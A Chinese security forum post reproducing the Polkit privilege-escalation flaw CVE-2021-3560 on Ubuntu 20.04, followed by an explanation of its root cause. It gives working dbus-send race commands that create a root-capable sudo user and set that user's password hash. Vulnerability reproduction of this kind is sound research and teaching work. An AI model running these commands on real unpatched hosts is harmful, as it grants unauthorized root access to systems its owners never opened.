
# [原创] CVE-2021-3560 Polkit 权限提升漏洞复现

6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过 Linux Polkit 来创建新的 root 用户。

Polkit 是 Linux 下的一个系统服务，允许特权进程给非特权进程提供服务：

> Polkit 则会根据特权进程提供的信息和权限配置文件进行认证
>
> 认证完成后将认证结果返回给特权进程
>
> 特权进程会根据认证结果来决定是否给非特权进程提供服务
>
> 而我们在认证操作中断开连接，导致无法获取认证结果
>
> 具体后边会详细分析

由于 `systemd` 使用 Polkit，所以几乎所有使用 `systemd` 的 Linux 都自带 Polkit。

## 复现

### 环境准备

环境：Ubuntu 20.04

SSH（在本地 SSH 下操作）：

```bash
sudo apt install ssh
sudo service ssh start
ssh username@127.0.0.1
```

具体为什么要用 `ssh`，这里不做赘述，可以自行百度 `dbus`。

`dbus-send` 是发送 D-Bus 消息的工具，主要用于测试。可以通过 `dbus-send` 从命令行触发 Polkit。

### 创建用户

通过 `dbus-send` 构造语句，来创建一个新用户：

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:yunku string:"YunKuSec" int32:1
```

![image-20210908153822606](https://bbs.kanxue.com/upload/attach/202109/862052_3A8DNUNX4PBVT85.jpg)

正常情况返回肯定是认证不通过的。上面说了通过中断来实现认证通过，所以继续构造语句：

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:yunku string:"YunKuSec" int32:1 & sleep 0.009s ; kill $!
```

这里是开始执行后 `0.009` 秒断开连接。多久断开连接要看具体执行时间，可以在前面加 `time` 测试。我这里大概时间在 `0.015` 秒左右，所以我提前在 `0.009` 秒断开，具体测试时看执行时间。

![image-20210908153847926](https://bbs.kanxue.com/upload/attach/202109/862052_GYDUV5H3Y6WUTZ2.jpg)

![image-20210908153920529](https://bbs.kanxue.com/upload/attach/202109/862052_C6T3AAP93R8R7WN.jpg)

运气比较好，一次就成了，有的可能运气不太好，需要多试个千八百次的。然后用 `id` 可以看到语句中构造的 `yunku` 已经存在了，而且在 `sudo` 组，具有 `root` 权限。

### 设置密码

现在已经成功利用漏洞创建了用户，但是该用户没有用户名，所以无法登录。继续构造语句来设置密码。

这里涉及到一个知识点，`dbus` 接口设置密码需要通过散列值。

通过 `openssl` 可以生成散列值（`-5` 是指定 `sha256` 算法来生成散列值，`-6` 是 `sha512`，`-1` 是 `md5`）：

```bash
openssl passwd -5 password
```

（这里 `password` 是个人需要设置的密码）

![image-20210908154039022](https://bbs.kanxue.com/upload/attach/202109/862052_YZN9298TTYW6RUM.jpg)

构造设置密码语句（`User1001` 是创建的 `sudo` 用户 `uid`，可以通过 `id 用户名` 查看，`string` 后放置密码散列值）：

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1001 org.freedesktop.Accounts.User.SetPassword string:'$5$P28GOS55linQ0Fe/$2dn4a1duWxR9wFIYeO7qfO7ieDZvE25zPh1oxm3/Pn6' string:Whatever & sleep 0.009s ; kill $!
```

![image-20210908154105892](https://bbs.kanxue.com/upload/attach/202109/862052_NN2DYVTE89ZUHTU.jpg)

这个也需要多试几次。成功之后可以登录尝试：

![image-20210908154147532](https://bbs.kanxue.com/upload/attach/202109/862052_YUXKVH3F9CDBCNP.jpg)

至此，复现结束！

## 原理

通过 `dbus` 创建新用户时，`dbus-send` 向 `account-daemon` 发起请求，会先发送到 `dbus-daemon`。`dbus-daemon` 会先添加一个 D-Bus `id`（这里方便理解 `id` 为 `10`）到请求中，然后将请求发给 `account-daemon`。`account-daemon` 收到请求后向 Polkit 询问 `id` 为 `10` 的连接有没有权限。Polkit 向 `dbus-daemon` 询问该连接的 `uid`。如果返回的 `uid` 为 `0`，就授权，否则打开验证密码窗口让用户输入密码。

以上步骤完成后，Polkit 返回 `true` 给 `account-daemon`，`account-daemon` 创建新用户。

但是！

如果我们在 Polkit 向 `dbus-daemon` 询问该连接的 `uid` 时断开，那这个连接就不存在；不存在，就会返回错误。而 Polkit 的错误处理信息不会拒绝该请求，而是将 `uid` 视为 `0`，来授权。
